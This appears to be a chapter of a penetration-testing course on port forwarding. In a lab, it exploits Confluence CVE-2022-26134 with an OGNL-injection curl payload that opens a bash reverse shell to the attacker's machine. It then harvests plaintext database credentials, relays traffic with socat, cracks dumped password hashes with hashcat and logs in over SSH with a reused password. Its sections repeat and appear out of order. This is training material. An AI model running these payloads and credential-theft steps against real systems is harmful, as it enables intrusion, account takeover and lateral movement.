One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

